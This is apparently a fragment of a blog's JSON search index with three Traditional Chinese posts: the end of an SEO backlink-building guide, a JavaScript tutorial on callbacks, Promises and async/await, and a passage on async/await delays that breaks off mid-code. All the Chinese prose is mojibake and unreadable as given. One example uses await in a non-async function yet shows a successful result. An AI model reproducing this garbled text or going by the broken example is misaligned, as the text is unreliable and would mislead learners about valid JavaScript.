ä¸‹ä¸€å‰‡è¨Šæ¯é€²è¡Œå®¢è£½åŒ–ã€‚\nç²å¾— Podcast çš„è¨ªè«‡ æ²’éŒ¯ï¼Œå®¢åº§æ–‡ç« æœ‰ä»–çš„é‡è¦åœ°ä½å­˜åœ¨\nä½†æœ‰ä¸€å€‹å¤§å•é¡Œï¼šå®ƒéœ€è¦èŠ±è²»å¾ˆå¤šæ™‚é–“æ’°å¯«ï¼\né€²å…¥ã€€Podcastã€€çš„ä¸–ç•Œã€‚\nèˆ‡å…¶èŠ±è²»æ™‚é–“æ’°å¯«å¤§ç¶±ã€æ“¬è‰ç¨¿ã€ä¿®æ”¹å®¢åº§æ–‡ç« ï¼Œä¸å¦‚å–®ç´”å‡ºç¾åœ¨ Podcast ç¯€ç›®ï¼Œä¸¦è«‡è«–ä½ æ‰€çŸ¥é“çš„å…§å®¹ã€‚\nè¹¦ï¼ä½ å°±å–å¾—äº†åå‘é€£çµã€‚\næœ€å¥½çš„åœ°æ–¹æ˜¯ä»€éº¼ï¼Ÿ\næ¯å€‹é ˜åŸŸéƒ½æœ‰ Podcast ç¯€ç›®ã€‚\nä»¥ä¸‹åå‘é€£ç¯€ï¼Œå°±æ˜¯æˆ‘å‡ºç¾åœ¨ Podcast å¾Œå»ºç«‹çš„ã€‚\nä½¿ç”¨ã€Œé€£çµäº¤é›†ã€æ‰¾å‡ºå¯èƒ½é€£çµè€… å¦‚æœæŸäººé€£çµçµ¦ä½ çš„ç«¶çˆ­è€…ï¼Œä»–å€‘å¯èƒ½ä¹Ÿæœƒæä¾›é€£çµçµ¦ä½ å°å§ï¼Ÿ\næ²’éŒ¯ã€‚\nå¦‚æœæŸäººé€£çµä½ çš„ 2 ä½ç«¶çˆ­è€…ï¼Œä»–ç”šè‡³æ›´æœ‰å¯èƒ½æä¾›é€£çµçµ¦ä½ ã€‚\nä½ å¦‚ä½•æ‰¾åˆ°é€™äº›ï¼Œé€£çµè¶…é 1 ä½ä»¥ä¸Šç«¶çˆ­è€…çš„ç¶²ç«™ã€‚\nSemrush Backlink Gap tool åªè¦åˆ—å‡º 2 åˆ° 3 ä½ä½ æœ€å¤§çš„ç¶²ç«™ç«¶çˆ­è€…ã€‚\né€™å€‹çµ•ä½³çš„å·¥å…·ï¼Œå°‡æœƒå‘ä½ é¡¯ç¤ºå“ªäº›äººèˆ‡ä»–å€‘é€£çµã€‚\nä½¿ç”¨ã€Œé å…ˆç­–ç•«ã€çš„é€£çµç›®æ¨™æ¸…å–® ä¸èƒ½å¦èªï¼šæ‰¾åˆ°é«˜å“è³ªçš„åå‘é€£çµéå¸¸å›°é›£ã€‚\né€™æ˜¯å€‹å£æ¶ˆæ¯ã€‚\nå¥½æ¶ˆæ¯æ˜¯ï¼Œæœ‰äº›äººå·²ç¶“ç‚ºä½ é å…ˆç­–ç•«å¥½ï¼Œé€™äº›é«˜å“è³ªçš„ç¶²ç«™\u0026hellip;\n\u0026hellip;ä»¥ã€Œæœ€ä½³éƒ¨è½æ ¼ã€æ¸…å–®çš„å½¢å¼ã€‚\nä»¥ä¸‹æ˜¯ç¯„ä¾‹ï¼š\næ›´ä¸ç”¨èªªï¼Œå¦‚æœä½ å†ç¶“ç‡Ÿä¸€å€‹çƒ˜ç„™éƒ¨è½æ ¼ï¼Œæ¯ä¸€å€‹ç¶²ç«™æ¸…å–®çš„é é¢ï¼Œéƒ½å°‡æœƒæ˜¯ä¸€å€‹åå‘é€£çµçš„å¥½æ©Ÿæœƒã€‚\nä½ å¯ä»¥é€éä»¥ä¸‹æœå°‹å­—è©ï¼Œæ‰¾åˆ°é€™äº›æ¸…å–®ï¼š\næœ€å¥½çš„ã€Œä¸»é¡Œã€éƒ¨è½æ ¼ ã€Œä¸»é¡Œã€éƒ¨è½æ ¼æ¸…å–®ã€‚ çµè«– ä»¥ä¸Šé€™å°±æ˜¯æˆ‘çš„ 2022 é€£çµå„ªåŒ–æŒ‡å—ã€‚\nå¾ä»Šå¤©çš„æŒ‡å—ä¸­ï¼Œä½ æœ€æƒ³è¦å„ªå…ˆå˜—è©¦å“ªå€‹ç­–ç•¥å‘¢ï¼Ÿæˆ–ä½ å°æ–¼æŸä»¶äº‹æœ‰ç–‘å•ã€‚\nä¸è«–å¦‚ä½•ï¼Œåœ¨åº•ä¸‹ç•™è¨€è®“æˆ‘çŸ¥é“ã€‚\n","date":"2022-08-17T00:00:00Z","image":"https://live.staticflickr.com/65535/52290179402_693c7086dc_o.jpg","permalink":"https://wayneblog.ga/2022-08-17/seo-backlinks-building-guide/","title":"SEO åå‘é€£çµå»ºç«‹ï¼šçµ‚æ¥µæŒ‡å—(2022)"},{"content":" åƒè€ƒå½­å½­ - å›å‘¼å‡½å¼ Callbacksã€Promises ç‰©ä»¶ã€Async/Await éåŒæ­¥æµç¨‹æ§åˆ¶\nå‰è¨€ Javascript çš„ä¸»è¦ç‰¹é»æœ‰å…©å€‹ï¼š\nSingle Thread (å–®ç·šç¨‹) Synchronous (åŒæ­¥) ç•¶ä¸»ç¨‹å¼ä¸­é‡åˆ°ã€ŒéåŒæ­¥ã€çš„å‡½å¼å¦‚æ’ç¨‹ã€å–è³‡æ–™ã€è®€æª”\u0026hellip;ç­‰ç›¸é—œçš„å‡½å¼æ™‚(å¦‚ï¼šsetTimeoutã€fetch\u0026hellip;ç­‰)ï¼Œä¸»ç¨‹å¼ä¸¦ä¸æœƒåœæ­¢ä¸¦ç­‰å¾…å‡½å¼åŸ·è¡Œå®Œæˆå¾Œæ‰ç¹¼çºŒå¾€ä¸‹è·‘ï¼Œè€Œæ˜¯æœƒå°‡å…¶æ”¾åˆ° queue ä¸­ç›´åˆ°æ‰€æœ‰ç¨‹å¼ç¢¼éƒ½è·‘å®Œäº†ï¼ŒJavascript æœƒå†å›é ­åˆ° queue ä¸­æŒ‰é †åºå°‡ function æ‹‰å›ä¾†è™•ç†ã€‚\n1 2 3 4 5 console.log(\u0026#34;ç¨‹å¼é–‹å§‹\u0026#34;); setTimeout(() =\u0026gt; { console.log(\u0026#34;éåŒæ­¥äº‹ä»¶\u0026#34;); }, 0) console.log(\u0026#34;ç¨‹å¼çµæŸ\u0026#34;); ç¨‹å¼é–‹å§‹\nç¨‹å¼çµæŸ\néåŒæ­¥äº‹ä»¶ \u0026lt;- æœ€å¾ŒåŸ·è¡Œ\nä¸Šæ®µçš„åŸå§‹ç¢¼ä¸­ï¼ŒsetTimeout æ‰€å®šç¾©çš„æ™‚é–“ç‚º 0ï¼Œä½†å› ç‚ºæ˜¯å±¬æ–¼éåŒæ­¥äº‹ä»¶ï¼Œå› æ­¤é‚„æ˜¯æœƒåœ¨å…¶ä»–åŸå§‹ç¢¼é‹è¡Œå®Œä»¥å¾Œæ‰åŸ·è¡Œï¼Œåœ¨ Ajax çš„è¡Œç‚ºä¸­ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œç•¶éœ€è¦ç¢ºä¿æ“·å–åˆ°é ç«¯è³‡æ–™æ‰ç¹¼çºŒå¾€ä¸‹åŸ·è¡Œæ™‚ï¼Œå¦‚æœç¨‹å¼ç¢¼æ˜¯ä¾åºæ’°å¯«çš„æ–¹å¼ï¼Œå°±æœƒç„¡æ³•æ­£ç¢ºå‘ˆç¾è³‡æ–™ï¼Œä»¥ä¸‹èˆ‰å€‹ä¾‹å­ç¤ºç¯„ã€‚\nèˆ‰ä¾‹ ä»¥ä¸‹ç‚ºä¾‹ï¼Œæ­¤ç‚ºä¸€å€‹å¾ˆåŸºæœ¬çš„å›å‚³n1+n2çš„çµæœçš„å‡½å¼ã€‚\n1 2 3 4 5 6 7 8 9 function add(n1, n2) { return n1+n2; } function test() { let result = add(3, 4); console.log(result) } test(); 1 \u0026gt; 7 ä½†è‹¥ä»Šå¤©éœ€æ±‚éœ€è¦å»¶é²å…©ç§’å†å°‡çµæœæ‰“å°å‡ºä¾†æ™‚ã€‚\n1 2 3 4 5 6 7 8 9 10 11 function delayedAdd(n1, n2, delayTime) { window.setTimeout(function() { return n1+n2; }, delayTime); } function test() { let result = delayedAdd(3, 4, 2000); console.log(result); } test(); 1 \u0026gt; undefined æ­¤æ™‚æœƒç™¼ç¾æ‰“å°å‡ºä¾†çš„ result å› ç‚º delayedAdd é‚„æœªå°‡çµæœå›å‚³ï¼Œå°è‡´ç›´æ¥é¡¯ç¤º undefinedï¼Œæ­¤æ™‚å°±éœ€è¦ä¾†è§£æ±ºé€™ç¨®éåŒæ­¥æµç¨‹çš„æ§åˆ¶ã€‚\næ–¹æ³•1ï¼šCallbacks å›å‘¼å‡½å¼ æœ€æ—©æœŸä½¿ç”¨çš„æ–¹å¼ï¼Œæ–¼å‡½å¼æœ€å¾Œè¨­å®šcallbackï¼ŒåŸ·è¡Œéœ€è¦åšçš„äº‹æƒ…ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // Callback å›å‘¼å‡½å¼ function delayedAdd(n1, n2, delayTime, callback) { // è¨­å®šæ’ç¨‹ï¼Œå»¶é²ä¸€æ®µæ™‚é–“å¾ŒåŸ·è¡Œ window.setTimeout(function() { // å»¶é²ä¸€æ®µæ™‚é–“ä¹‹å¾Œï¼Œè¨ˆç®—åŠ æ³•ï¼Œå‘¼å« callback å‡½å¼ callback(n1+n2); }, delayTime); } function test() { delayedAdd(3, 4, 2000, function(result) { console.log(result); }); } test(); 1 \u0026gt; 7 æ–¹æ³•2ï¼šPromise ç‰©ä»¶ è¿‘æœŸæ–¼ES6æå‡ºçš„æ–°æ–¹å¼ã€‚ å»ºç«‹ promise ç‰©ä»¶ï¼šnew Promise(åŸ·è¡Œå‡½å¼) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ let p = new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // å‘¼å«resolveå°‡çµæœå›å‚³ }, delayTime); }); return p; } function test() { let promise = delayedAdd(3, 4, 2000); promise.then(function(result){ console.log(result); }); } test(); 1 \u0026gt; 7 å¸¸è¦‹å¯«æ³•ï¼Œç›´æ¥ return promise 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // å‘¼å«resolveå°‡çµæœå›å‚³ }, delayTime); }); } function test() { let promise = delayedAdd(3, 4, 2000); promise.then(function(result){ console.log(result); }); } test(); 1 \u0026gt; 7 new Promise(resolve, reject) çš„ resolve èˆ‡ reject ç‚º Promise åŸç”Ÿæä¾›ï¼Œå¯è‡ªè¡Œæ”¹åä½†é †åºä¸å¯ç•°å‹•ã€‚ resolve å°æ‡‰.then()ä¸”ä»£è¡¨æˆåŠŸï¼Œè€Œ reject å‰‡å°æ‡‰åˆ° .catch()ä¸”ä»£è¡¨å¤±æ•—ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { reject(n1+n2); // è‹¥ä½¿ç”¨rejectï¼Œå‰‡éœ€ä½¿ç”¨.catch }, delayTime); }); } function test() { let promise = delayedAdd(3, 4, 2000); // å› ä½¿ç”¨ reject å›å‚³ï¼Œé€™è£¡ä½¿ç”¨ .catch ä¾†æ¥ promise.catch(function(error){ console.log(error); }); } test(); 1 \u0026gt; 7 æ–¹æ³•3ï¼šAsync/Await ï¼ŒPromise çš„èªæ³•ç³– Promiseçš„èªæ³•ç³–ï¼Œä»¥ä¾¿æ–¼æ›´ç›´è§€çš„é–±è®€èˆ‡æ’°å¯«éåŒæ­¥æµç¨‹ï¼ŒåŒ Promise æ–¼ES6æå‡ºçš„æ–°ç©æ„å…’ã€‚ æ³¨æ„ï¼šawait çš„å‡½å¼å¿…é ˆè¦ç¢ºä¿æœ‰Promiseï¼Œå¦å‰‡å°‡å ±éŒ¯ã€‚ éœ€å…ˆå®£å‘Šç‚º async å‡½å¼ï¼Œæ‰èƒ½ä½¿ç”¨ awaitã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // è‹¥ä½¿ç”¨rejectï¼Œå‰‡éœ€ä½¿ç”¨.catch }, delayTime); }); } // éœ€å…ˆå®£å‘Šç‚º async å‡½å¼ï¼Œæ‰å¯ä½¿ç”¨ await async function test() { let result = await delayedAdd(3, 4, 2000); console.log(result); } test(); 1 \u0026gt; 7 æ³¨æ„ï¼šä½¿ç”¨ await æ™‚ï¼Œä¸»ç¨‹å¼æœƒç¢ºå¯¦åœæ­¢ï¼Œç­‰å¾… await å‡½å¼åŸ·è¡Œå®Œæˆå¾Œï¼Œæ‰æ¥çºŒå¾€ä¸‹è·‘ï¼Œèˆ‰ä¾‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // è‹¥ä½¿ç”¨rejectï¼Œå‰‡éœ€ä½¿ç”¨.catch }, delayTime); }); } // éœ€å…ˆå®£å‘Šç‚º async å‡½å¼ï¼Œæ‰å¯ä½¿ç”¨ await async function test() { let result = await delayedAdd(3, 4, 2000); console.log(result); console.log(\u0026#34;Hello\u0026#34;); } test(); 1 2 \u0026gt; 7 \u0026gt; Hello å»¶ä¼¸ä¸€ï¼šå¤šå€‹ Promise çš„è³‡æ–™è™•ç†ï¼šPromise.all() è‹¥é‡åˆ°å¤šå€‹ Promiseï¼Œä¸”éœ€å°‡å„å€‹ Promise çš„çµæœé€²è¡Œé‹ç®—æ™‚ï¼Œå¯ä½¿ç”¨ Promise.all() ä¾†è™•ç†ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // å‘¼å«resolveå°‡çµæœå›å‚³ }, delayTime); }); } function test() { let promise1 = delayedAdd(3, 4, 2000); let promise2 = delayedAdd(2, 3, 3000); // å¤šå€‹ Promise éƒ½å®Œæˆä¹‹å¾Œï¼Œå°‡å…¶æ•¸å€¼ç›¸ä¹˜ Promise.all([promise1, promise2]).then(function(results){ // æ­¤æ™‚ results ç‚ºä¸€å€‹é™£åˆ— \u0026gt; [7, 5]; let answer = results.reduce(function(total, value) { return total * value; }) console.log(answer); }); } test(); 1 \u0026gt; 35 å»¶ä¼¸äºŒï¼šå¤šå€‹ Promise ä½¿ç”¨ Async/Await 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function delayedAdd(n1, n2, delayTime) { // å»ºç«‹ Promiseï¼Œä½¿ç”¨resolveæˆ–rejectå›å‚³ return new Promise(function(resolve, reject) { window.setTimeout(function() { resolve(n1+n2); // å‘¼å«resolveå°‡çµæœå›å‚³ }, delayTime); }); } function test() { let result1 = await delayedAdd(3, 4, 2000); let result2 = await delayedAdd(2, 3, 3000); let answer = result1 * result2; console.log(answer); } test(); 1 \u0026gt; 35 ","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52282531224_1f57c841ee_o.jpg","permalink":"https://wayneblog.ga/2022-08-13/js-async-programs/","title":"ã€Callbackã€Promiseã€Async/Awaitã€‘è™•ç†éåŒæ­¥äº‹ä»¶"},{"content":" æœ¬æ–‡åƒè€ƒç¶²å€\nä»€éº¼æ˜¯ asyncï¼Ÿä»€éº¼æ˜¯ awaitï¼Ÿ åœ¨ JavaScript çš„ä¸–ç•Œï¼ŒåŒæ­¥ sync å’ŒéåŒæ­¥ async çš„æ„›æ¨æƒ…ä»‡ï¼Œå°±å¦‚åŒå¶åƒåŠ‡ä¸€èˆ¬çš„å‰ªä¸æ–·ç†é‚„äº‚ï¼Œç‰¹åˆ¥åƒæ˜¯setTimeoutã€setIntervalã€MLHttpRequestæˆ–fetché€™äº›åŒæ­¥éåŒæ­¥æ··é›œçš„ç”¨æ³•ï¼Œéƒ½æœƒè®“äººä¸€å€‹é ­å…©å€‹å¤§ï¼Œå¹¸å¥½ ES6 å‡ºç¾äº† promiseï¼ŒES7 å‡ºç¾äº† asyncã€awaitï¼Œå¹«åŠ©æˆ‘å€‘å¯ä»¥æ›´å®¹æ˜“çš„é€²è¡Œç¨‹å¼é‚è¼¯çš„æ’°å¯«ã€‚\nå°æ–¼åŒæ­¥å’ŒéåŒæ­¥ï¼Œæœ€å¸¸è¦‹çš„èªªæ³•æ˜¯ã€ŒåŒæ­¥æ¨¡å¼ä¸‹ï¼Œæ¯å€‹ä»»å‹™å¿…é ˆæŒ‰ç…§é †åºåŸ·è¡Œï¼Œå¾Œé¢çš„ä»»å‹™å¿…é ˆç­‰å¾…å‰é¢çš„ä»»å‹™åŸ·è¡Œå®Œæˆï¼ŒéåŒæ­¥æ¨¡å¼å‰‡ç›¸åï¼Œå¾Œé¢çš„ä»»å‹™ä¸ç”¨ç­‰å‰é¢çš„ï¼Œå„è‡ªåŸ·è¡Œå„è‡ªçš„ä»»å‹™ã€ï¼Œä½†æˆ‘è¦ºå¾—é€™æ¨£å¯¦åœ¨ä¸å®¹æ˜“ç†è§£ï¼Œä¸å®¹æ˜“ç†è§£çš„åœ°æ–¹åœ¨æ–¼ã€Œä¸­æ–‡ã€çš„åŒæ­¥å’ŒéåŒæ­¥ï¼Œå¯èƒ½å’Œå¯¦éš›ä¸Šçš„è§£é‡‹å‰›å¥½ç›¸åäº† ( åŒæ­¥çš„ä¸­æ–‡å­—é¢æ„æ€æ˜¯ã€Œä¸€èµ·èµ°ã€ï¼ŒéåŒæ­¥çš„ä¸­æ–‡æ„æ€æ˜¯ã€Œä¸è¦ä¸€èµ·èµ°ã€ï¼Œè¶…å®¹æ˜“æéŒ¯çš„ )ï¼Œå› æ­¤å¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£ä¹Ÿå¾ˆå®¹æ˜“æéŒ¯ï¼Œå¯ä»¥ä½¿ç”¨æˆ‘è¦ºå¾—æ¯”è¼ƒå¥½ç†è§£çš„æ–¹æ³•ï¼šã€ŒåŒä¸€å€‹æ­¥é“ vs ä¸åŒæ­¥é“ã€ï¼Œé€éæ­¥é“çš„æ–¹å¼ï¼Œå°±æ›´å®¹æ˜“æ˜ç™½åŒæ­¥å’ŒéåŒæ­¥ã€‚\nåŒæ­¥ï¼šåœ¨ã€ŒåŒä¸€å€‹æ­¥é“ã€æ¯”è³½ã€Œæ¥åŠ›è³½è·‘ã€ï¼Œç•¶æ£’å­æ²’æœ‰äº¤çµ¦æˆ‘ï¼Œæˆ‘å°±å¾—ç­‰ä½ ï¼Œä¸èƒ½è·‘ã€‚\néåŒæ­¥ï¼šåœ¨ã€Œä¸ ( é ) åŒæ­¥é“ã€æ¯”è³½ã€Œè³½è·‘ã€ï¼Œèª°éƒ½ä¸ç­‰èª°ï¼Œåªè¦è¼ªåˆ°æˆ‘è·‘ï¼Œæˆ‘å°±é–‹å§‹è·‘ã€‚\nåœ¨ ES7 è£¡é ­ async çš„æœ¬è³ªæ˜¯ promise çš„èªæ³•ç³– ( åŒ…è£å¾—ç”œç”œçš„æ¯”è¼ƒå¥½åƒä¸‹è‚š )ï¼Œåªè¦ function æ¨™è¨˜ç‚º asyncï¼Œå°±è¡¨ç¤ºè£¡é ­å¯ä»¥æ’°å¯« await çš„åŒæ­¥èªæ³•ï¼Œè€Œ await é¡§åæ€ç¾©å°±æ˜¯ã€Œç­‰å¾…ã€ï¼Œå®ƒæœƒç¢ºä¿ä¸€å€‹ promise ç‰©ä»¶éƒ½è§£æ±º ( resolve ) æˆ–å‡ºéŒ¯ ( reject ) å¾Œæ‰æœƒé€²è¡Œä¸‹ä¸€æ­¥ï¼Œç•¶ async function çš„å…§å®¹å…¨éƒ½çµæŸå¾Œï¼Œæœƒè¿”å›ä¸€å€‹ promiseï¼Œé€™è¡¨ç¤ºå¾Œæ–¹å¯ä»¥ä½¿ç”¨.thenèªæ³•ä¾†åšé€£æ¥ï¼ŒåŸºæœ¬çš„ç¨‹å¼é•·ç›¸å°±åƒä¸‹é¢é€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 async function a(){ await b(); ..... // ç­‰ b() å®Œæˆå¾Œæ‰æœƒåŸ·è¡Œ await c(); ..... // ç­‰ c() å®Œæˆå¾Œæ‰æœƒåŸ·è¡Œ await new Promise(resolve=\u0026gt;{ ..... }); ..... // ä¸Šæ–¹çš„ promise å®Œæˆå¾Œæ‰æœƒåŸ·è¡Œ } a(); a().then(()=\u0026gt;{ ..... // ç­‰ a() å®Œæˆå¾Œæ¥è‘—åŸ·è¡Œ }); åˆ©ç”¨ async å’Œ await åšå€‹ã€Œæ¼‚äº®çš„ç­‰å¾…ã€ æ¯”è¼ƒäº†è§£ async å’Œ await çš„æ„æ€ä¹‹å¾Œï¼Œå°±ä¾†è©¦è©¦çœ‹åšå€‹ã€Œæ¼‚äº®çš„ç­‰å¾…ã€ï¼Œéå»æœ‰ä½¿ç”¨ ES6 çš„ promise ä¾†å¯¦ç¾ delay ( å¦‚åŒä¸‹æ–¹çš„ç¨‹å¼ç¯„ä¾‹ )ï¼Œé€™å€‹ delay é€é.thenä¾†å®Œæˆä¸€æ­¥ä¸€æ­¥çš„ä¸²æ¥ï¼Œé›–ç„¶é‚è¼¯ä¸Šå¾ˆæ¸…æ¥šï¼Œä½†è‹¥è¦å¯¦ä½œæ¯”è¼ƒè¤‡é›œçš„æµç¨‹ï¼Œå°±å¾—æŠŠæ¯å€‹ç¨‹å¼å¯«åœ¨å°æ‡‰çš„ callback è£ï¼Œä¹Ÿå°±æ²’æœ‰æƒ³åƒçš„å®¹æ˜“ï¼Œé€™å°±æ˜¯ã€Œä¸å¤ªæ¼‚äº®çš„ç­‰å¾…ã€ ( ä½¿ç”¨ setTimeout çš„åšæ³•å°±æ˜¯ä¸æ¼‚äº®çš„ç­‰å¾… )ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ä¸æ¼‚äº®çš„ç­‰å¾… const delay = (s) =\u0026gt; { return new Promise(resolve =\u0026gt; { setTimeout(resolve,s); }); }; delay().then(() =\u0026gt; { console.log(1); // é¡¯ç¤º 1 return delay(1000); // å»¶é²ã„§ç§’ }).then(() =\u0026gt; { console.log(2); // é¡¯ç¤º 2 return delay(2000); // å»¶é²äºŒç§’ }).then(() =\u0026gt; { console.log(3); // é¡¯ç¤º 3 }); å¦‚æœæˆ‘å€‘æŠŠä¸Šé¢çš„ç¯„ä¾‹ä¿®æ”¹ç‚º async å’Œ await çš„å¯«æ³•ï¼Œçªç„¶å°±ç™¼ç¾ç¨‹å¼ç¢¼çœ‹èµ·ä¾†éå¸¸çš„ä¹¾æ·¨ï¼Œå› ç‚º await æœƒç­‰å¾…æ”¶åˆ° resolve ä¹‹å¾Œæ‰æœƒé€²è¡Œå¾Œé¢çš„å‹•ä½œï¼Œå¦‚æœæ²’æœ‰æ”¶åˆ°å°±æœƒä¸€ç›´è™•åœ¨ç­‰å¾…çš„ç‹€æ…‹ï¼Œæ‰€ä»¥ä»€éº¼æ™‚å€™è©²ç­‰å¾…ï¼Œä»€éº¼æ™‚å€™è©²åšä¸‹ä¸€æ­¥ï¼Œå°±æœƒéå¸¸æ¸…æ¥šæ˜ç­ï¼Œé€™ä¹Ÿå°±æ˜¯æˆ‘æ‰€è¬‚ã€Œæ¼‚äº®çš„ç­‰å¾…ã€ã€‚\næ³¨æ„ï¼Œawait ä¸€å®šå¾—é‹è¡Œåœ¨ async function å…§ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 ~async function{ // ~ é–‹é ­è¡¨ç¤ºç›´æ¥åŸ·è¡Œé€™å€‹ functionï¼Œçµå°¾æœ‰ () const delay = (s) =\u0026gt; { return new Promise(function(resolve){ // å›å‚³ä¸€å€‹ promise setTimeout(resolve,s); // ç­‰å¾…å¤šå°‘ç§’ä¹‹å¾Œ resolve() }); }; console.log(1); // é¡¯ç¤º 1 await delay(1000); // å»¶é²ã„§ç§’ console.log(2); // é¡¯ç¤º 2 await delay(2000); // å»¶é²äºŒç§’ console.log(3); // é¡¯ç¤º 3 }(); æ­é… Promise åŸºæœ¬ä¸Šåªè¦æœ‰ async å’Œ await çš„åœ°æ–¹ï¼Œå°±ä¸€å®šæœ‰ promise çš„å­˜åœ¨ï¼Œpromise é¡§åæ€ç¾©å°±æ˜¯ã€Œä¿è­‰åŸ·è¡Œä¹‹å¾Œæ‰æœƒåšä»€éº¼äº‹æƒ…ã€ï¼Œå‰›å‰›ä½¿ç”¨äº† asyncã€await å’Œ promise æ”¹å–„setTimeouté€™å€‹å®¹æ˜“å‡ºéŒ¯çš„éåŒæ­¥ç­‰å¾…ï¼Œé‡å°setIntervalï¼Œä¹Ÿèƒ½ç”¨åŒæ¨£çš„åšæ³•ä¿®æ”¹ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œä¸‹é¢çš„ç¨‹å¼ç¢¼åŸ·è¡Œä¹‹å¾Œï¼Œä¸¦ã€Œä¸æœƒã€å¦‚æˆ‘å€‘é æœŸçš„ã€Œå…ˆé¡¯ç¤º 1ï¼Œå†é¡¯ç¤º haha0\u0026hellip;haha5ï¼Œæœ€å¾Œå†é¡¯ç¤º 2ã€ï¼Œè€Œæ˜¯ã€Œå…ˆé¡¯ç¤º 1 å’Œ 2ï¼Œç„¶å¾Œå†å‡ºç¾ haha0\u0026hellip;haha5ã€ï¼Œå› ç‚ºé›–ç„¶ç¨‹å¼é‚è¼¯æ˜¯å¾ä¸Šå¾€ä¸‹ï¼Œä½†åœ¨ count function è£é ­æ˜¯éåŒæ­¥çš„èªæ³•ï¼Œå°è‡´è‡ªå·±èµ°è‡ªå·±çš„è·¯ï¼Œä¹Ÿé€ æˆäº†çµæœçš„ä¸å¦‚é æœŸã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const count = (t,s) =\u0026gt; { let a = 0; let timer = setInterval(() =\u0026gt; { console.log(`${t}${a}`); a = a + 1; if(a\u0026gt;5){ clearInterval(timer); } },s); }; console.log(1); count(\u0026#39;haha\u0026#39;, 100); console.log(2); é€™æ™‚æˆ‘å€‘å¯ä»¥é€é asyncã€await å’Œ promise é€²è¡Œä¿®æ­£ï¼Œåœ¨é¡¯ç¤º 1 ä¹‹å¾Œï¼Œæœƒã€Œç­‰å¾…ã€count function çµæŸå¾Œå†é¡¯ç¤º 2ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ~async function(){ const count = (t,s) =\u0026gt; { return new Promise(resolve =\u0026gt; { let a = 0; let timer = setInterval(() =\u0026gt; { console.log(`${t}${a}`); a = a + 1; if(a\u0026gt;5){ clearInterval(timer); resolve(); // è¡¨ç¤ºå®Œæˆ } },s); }); }; console.log(1); await count(\u0026#39;haha\u0026#39;, 100); console.log(2); }(); é™¤äº†setTimeoutå’ŒsetIntervalï¼Œé€™ä¹Ÿå¯ä»¥ç”¨æ–¼åƒæ˜¯ã€Œè¼¸å…¥æ–‡å­—ã€çš„æƒ…å¢ƒï¼Œéå»æˆ‘å€‘è¦åšåˆ°ã€Œé€£çºŒè¼¸å…¥ã€æ–‡å­—ï¼Œå¯èƒ½è¦å±¤å±¤ç–Šç–Šå¯«å€‹å¥½å¹¾å€‹ callbackï¼Œç¾åœ¨å¦‚æœä½¿ç”¨ async å’Œ awaitï¼Œå°±èƒ½å¤ å¾ˆç°¡å–®çš„å¯¦ç¾é€£çºŒè¼¸å…¥çš„æƒ…å¢ƒï¼Œç¨‹å¼ç¢¼çœ‹èµ·ä¾†ä¹Ÿæ›´ä¹¾æ·¨ç°¡æ½”ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // HTML ç‚ºä¸€å€‹è¼¸å…¥æ¡†ã€ä¸€å€‹æŒ‰éˆ•å’Œä¸€å€‹ h1 æ¨™ç±¤ // \u0026lt;input id=\u0026#34;a\u0026#34;\u0026gt;\u0026lt;/input\u0026gt;\u0026lt;button id=\u0026#34;b\u0026#34;\u0026gt;send\u0026lt;/button\u0026gt; // \u0026lt;h1 id=\u0026#34;h\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; ~async function(){ const input = () =\u0026gt; { return new Promise(resolve =\u0026gt;{ const btnClick = () =\u0026gt;{ h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, a.value + \u0026#39;\u0026lt;br/\u0026gt;\u0026#39;); // è¼¸å…¥å¾Œåœ¨ h1 è£¡æ·»åŠ å…§å®¹ a.value = \u0026#39;\u0026#39;; // æ¸…ç©ºè¼¸å…¥æ¡† a.focus(); // å°‡ç„¦é»ç§»è‡³è¼¸å…¥æ¡† b.removeEventListener(\u0026#39;click\u0026#39;, btnClick); // removeEventListener é¿å…é‡è¤‡ç¶å®šäº‹ä»¶ resolve(); // å®Œæˆ }; b.addEventListener(\u0026#39;click\u0026#39;, btnClick); // ç¶å®šæŒ‰éˆ•äº‹ä»¶ }); }; h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, 